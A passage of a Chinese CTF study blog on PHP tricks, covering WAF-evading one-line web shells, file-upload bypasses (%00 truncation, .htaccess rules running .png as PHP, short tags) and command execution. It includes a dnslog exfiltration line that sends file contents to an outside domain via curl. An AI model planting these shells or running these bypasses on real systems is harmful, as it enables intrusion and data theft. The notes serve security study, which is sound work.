<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo%20phpinfo();&quot;</span>);<span class="comment">//注意eval里一定要有引号和分号结束，以及echo不能再接引号了，否则要转义</span></span><br><span class="line"><span class="variable">$poc</span>=<span class="string">&quot;a#s#s#e#r#t&quot;</span>; <span class="variable">$poc_1</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,<span class="variable">$poc</span>); <span class="variable">$poc_2</span>=<span class="variable">$poc_1</span>[<span class="number">0</span>].<span class="variable">$poc_1</span>[<span class="number">1</span>].<span class="variable">$poc_1</span>[<span class="number">2</span>].<span class="variable">$poc_1</span>[<span class="number">3</span>].<span class="variable">$poc_1</span>[<span class="number">4</span>].<span class="variable">$poc_1</span>[<span class="number">5</span>]; <span class="variable">$poc_2</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>])<span class="comment">//过狗一句话</span></span><br></pre></td></tr></table></figure>
<h2 id="后缀名绕过"><a href="#后缀名绕过" class="headerlink" title="后缀名绕过"></a>后缀名绕过</h2><p>1.%00截断<br>2.py</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;find /* |grep flag&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="路径绕过"><a href="#路径绕过" class="headerlink" title="路径绕过"></a>路径绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./ ../ /</span><br><span class="line">在文件名后面加/</span><br></pre></td></tr></table></figure>
<h2 id="htaccess解析绕过"><a href="#htaccess解析绕过" class="headerlink" title=".htaccess解析绕过"></a>.htaccess解析绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure>
<h2 id="内容绕过"><a href="#内容绕过" class="headerlink" title="内容绕过"></a>内容绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;#\w&#123;2,&#125;|[678]|&lt;\?|/#&#x27;</span>,<span class="variable">$content</span>);<span class="comment">//不能出现2个及以上字母或数字|&lt;?|/</span></span><br></pre></td></tr></table></figure>
<p>1.用字符串连接符.绕过<br>2.可变函数绕过(注意eval函数不能用)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = &#x27;a&#x27;.&#x27;s&#x27;.&#x27;s&#x27;.&#x27;e&#x27;.&#x27;r&#x27;.&#x27;t&#x27;</span><br><span class="line">$a();</span><br></pre></td></tr></table></figure>
<p>3.结尾的结束符?&gt;可忽略，因为php是动态脚本<br>4.短标签绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="meta">?&gt;</span> <span class="comment">//所有情况可用</span></span><br><span class="line"><span class="meta">&lt;?</span> <span class="meta">?&gt;</span> <span class="comment">//需开启短标签</span></span><br><span class="line">&lt;script language=<span class="string">&quot;PHP&quot;</span>&gt; &lt;script/&gt;</span><br></pre></td></tr></table></figure>
<p>5.eval,assert<br>6.system,wget,nc,exec,passthru,netcat,curl </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl `cat flag.php|grep <span class="string">&quot;flag&quot;</span>`.当时创建的域名 <span class="comment">//dnslog</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>1.注释，如<code>$v2=/*,$v3=*/</code><br>2.命令分隔符;</p>
<hr>
</div><div class="article-licensing box"><div class="licensing-title"><p><a href="https://sx-zhang.top/2022/05/29/web/PHP的tricks/">https://sx-zhang.top/2022/05/29/web/PHP的tricks/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>Shixuan Zhang</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2022-05-29</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2022-06-02</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/php/">php</a></div><div class="sharethis-inline-share-buttons"></div><script src="https://platform-api.sharethis.com/js/sharethis.js#property=6250f03420c5f3001916ab7f&amp;product=inline-share-buttons" defer></script></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2022/05/28/web/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><span class="level-item"> </span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script>var gitalk = new Gitalk({
            id: "433872ce2bf4f2941344066af923fd5f",
            repo: "gittalk-comments",
            owner: "zhangsx19",
            clientID: "58a3f2f97d6428a7b995",
            clientSecret: "88106c2d09c6d5803d639decb5bc2d0a3b0d443d",
            admin: ["zhangsx19"],
            createIssueManually: false,
            distractionFreeMode: false,
            perPage: 20,
            pagerDirection: "last",
            
            
            enableHotKey: true,
            language: "zh-CN",
        })
        gitalk.render('comment-container')</script></div></div></div><!--!--><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#搭建环境"><span class="level-left"><span class="level-item">搭建环境</span></span></a></li><li><a class="level is-mobile" href="#一-伪随机数"><span class="level-left"><span class="level-item">一.伪随机数</span></span></a></li><li><a class="level is-mobile" href="#二、函数"><span class="level-left"><span class="level-item">二、函数</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#intval"><span class="level-left"><span class="level-item">intval</span></span></a></li><li><a class="level is-mobile" href="#preg-match"><span class="level-left"><span class="level-item">preg_match()</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#正则表达式"><span class="level-left"><span class="level-item">正则表达式</span></span></a></li><li><a class="level is-mobile" href="#绕过方法："><span class="level-left"><span class="level-item">绕过方法：</span></span></a></li></ul></li><li><a class="level is-mobile" href="#ereg"><span class="level-left"><span class="level-item">ereg()</span></span></a></li><li><a class="level is-mobile" href="#highlight-file"><span class="level-left"><span class="level-item">highlight_file</span></span></a></li><li><a class="level is-mobile" href="#file-put-contents"><span class="level-left"><span class="level-item">file_put_contents</span></span></a></li><li><a class="level is-mobile" href="#in-array"><span class="level-left"><span class="level-item">in_array()</span></span></a></li><li><a class="level is-mobile" href="#is-numeric"><span class="level-left"><span class="level-item">is_numeric</span></span></a></li><li><a class="level is-mobile" href="#is-file"><span class="level-left"><span class="level-item">is_file</span></span></a></li><li><a class="level is-mobile" href="#call-user-func-函数，参数"><span class="level-left"><span class="level-item">call_user_func(函数，参数)</span></span></a></li><li><a class="level is-mobile" href="#parse-str"><span class="level-left"><span class="level-item">parse_str</span></span></a></li><li><a class="level is-mobile" href="#eregi、ereg"><span class="level-left"><span class="level-item">eregi、ereg</span></span></a></li></ul></li><li><a class="level is-mobile" href="#三、字符串"><span class="level-left"><span class="level-item">三、字符串</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#strpos"><span class="level-left"><span class="level-item">strpos</span></span></a></li><li><a class="level is-mobile" href="#str-replace"><span class="level-left"><span class="level-item">str_replace</span></span></a></li><li><a class="level is-mobile" href="#strtr"><span class="level-left"><span class="level-item">strtr</span></span></a></li><li><a class="level is-mobile" href="#表单"><span class="level-left"><span class="level-item">表单</span></span></a></li></ul></li><li><a class="level is-mobile" href="#四、md5、sha1"><span class="level-left"><span class="level-item">四、md5、sha1</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#弱类型比较"><span class="level-left"><span class="level-item">弱类型比较</span></span></a></li><li><a class="level is-mobile" href="#x3D-x3D-x3D-数组碰撞"><span class="level-left"><span class="level-item">===数组碰撞</span></span></a></li></ul></li><li><a class="level is-mobile" href="#五、运算符优先级"><span class="level-left"><span class="level-item">五、运算符优先级</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#and"><span class="level-left"><span class="level-item">and</span></span></a></li><li><a class="level is-mobile" href="#amp-amp"><span class="level-left"><span class="level-item">&amp;&amp; ||</span></span></a></li></ul></li><li><a class="level is-mobile" href="#六、内置类"><span class="level-left"><span class="level-item">六、内置类</span></span></a></li><li><a class="level is-mobile" href="#七、伪协议"><span class="level-left"><span class="level-item">七、伪协议</span></span></a></li><li><a class="level is-mobile" href="#八、全局变量"><span class="level-left"><span class="level-item">八、全局变量</span></span></a></li><li><a class="level is-mobile" href="#其他"><span class="level-left"><span class="level-item">其他</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#题目给了eval-quot-c-quot"><span class="level-left"><span class="level-item">题目给了eval(&quot;$c&quot;)</span></span></a></li><li><a class="level is-mobile" href="#SERVER"><span class="level-left"><span class="level-item">$_SERVER</span></span></a></li><li><a class="level is-mobile" href="#变量覆盖"><span class="level-left"><span class="level-item">变量覆盖</span></span></a></li></ul></li><li><a class="level is-mobile" href="#文件上传"><span class="level-left"><span class="level-item">文件上传</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#后缀名绕过"><span class="level-left"><span class="level-item">后缀名绕过</span></span></a></li><li><a class="level is-mobile" href="#路径绕过"><span class="level-left"><span class="level-item">路径绕过</span></span></a></li><li><a class="level is-mobile" href="#htaccess解析绕过"><span class="level-left"><span class="level-item">.htaccess解析绕过</span></span></a></li><li><a class="level is-mobile" href="#内容绕过"><span class="level-left"><span class="level-item">内容绕过</span></span></a></li></ul></li><li><a class="level is-mobile" href="#命令执行"><span class="level-left"><span class="level-item">命令执行</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/mylogo.jpg" alt="sx-zhang" height="28"></a><p class="is-size-7"><span>&copy; 2022 Shixuan Zhang</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/zhangsx19"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.9/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>